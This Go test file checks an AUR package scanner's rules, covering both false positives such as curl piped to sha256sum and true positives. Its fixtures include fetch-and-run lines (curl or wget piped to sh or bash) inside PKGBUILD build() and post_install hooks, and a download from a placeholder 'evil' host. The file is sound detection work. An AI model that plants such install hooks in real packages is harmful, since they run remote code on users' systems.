package rules

import "testing"

// Regressions found by running the rule set over ~158 real AUR packages.
// Each case here was a CRITICAL finding on a package that is not malicious.
// Two of them (DLE-001/DLE-002) sit in fatalCodes, meaning the model is not
// permitted to clear them — so a false positive there is not noise, it is a
// package the scanner would refuse to pass forever.
func TestCorpusFalsePositives(t *testing.T) {
	cases := []struct {
		name, file, content, mustNotFire string
	}{
		// `sh` matched the start of `sha256sum`: a checksum helper read as
		// curl-pipe-bash. Seen in nodejs-webpack's release script.
		{"wget-pipe-sha256sum", "release",
			`SUM="$(wget "http://registry.npmjs.org/webpack/-/webpack-$V.tgz" -qO - | sha256sum | cut -d' ' -f1)"`,
			"DLE-002"},
		{"curl-pipe-sha256sum", "update.sh",
			`curl -sL "$url" | sha256sum`, "DLE-001"},
		{"curl-pipe-shasum", "update.sh",
			`curl -sL "$url" | shasum -a 256`, "DLE-001"},
		{"curl-pipe-shuf", "helper.sh",
			`curl -s "$url" | shuf -n1`, "DLE-001"},
		// .SRCINFO is generated metadata; optdepends DECLARES a dependency
		// named sudo, it does not invoke it. Seen in downgrade.
		{"srcinfo-optdepends-sudo", ".SRCINFO",
			"pkgbase = downgrade\n\toptdepends = sudo: for installation via sudo", "PRIV-001"},
		{"srcinfo-depends-sudo", ".SRCINFO",
			"pkgbase = x\n\tdepends = sudo", "PRIV-001"},
		// Maintainer tooling is committed to the AUR repo but never executed by
		// makepkg or pacman.
		{"release-script-download-run", "release",
			`curl -sL https://example.org/i.sh | sh`, "DLE-001"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			for _, h := range Scan(map[string]string{c.file: c.content}) {
				if h.Code == c.mustNotFire {
					t.Errorf("false positive %s on %s: %q", h.Code, c.file, h.Snippet)
				}
			}
		})
	}
}

// The narrowing must not blind the scanner to the real thing. Every case below
// is the same behaviour in a file that IS executed, or piped to an actual
// shell rather than a checksum tool.
func TestCorpusFixesKeepTruePositives(t *testing.T) {
	cases := []struct {
		name, file, content, mustFire string
	}{
		{"curl-pipe-sh", "PKGBUILD", `build(){ curl -sL http://x/i.sh | sh; }`, "DLE-001"},
		{"curl-pipe-bash", "PKGBUILD", `build(){ curl -sL http://x/i.sh | bash; }`, "DLE-001"},
		{"wget-pipe-sh", "x.install", `post_install(){ wget -qO- http://x/i.sh | sh; }`, "DLE-002"},
		{"wget-pipe-bash-args", "x.install", `post_install(){ wget -qO- http://x/i.sh | bash -s -- --yes; }`, "DLE-002"},
		{"sudo-in-pkgbuild", "PKGBUILD", `package(){ sudo make install; }`, "PRIV-001"},
		{"curl-in-scriptlet", "x.install", `post_install(){ curl http://evil/p -o /tmp/p; }`, "INSTALL-003"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := false
			for _, h := range Scan(map[string]string{c.file: c.content}) {
				if h.Code == c.mustFire {
					got = true
				}
			}
			if !got {
				t.Errorf("expected %s to fire on %s: %q", c.mustFire, c.file, c.content)
			}
		})
	}
}
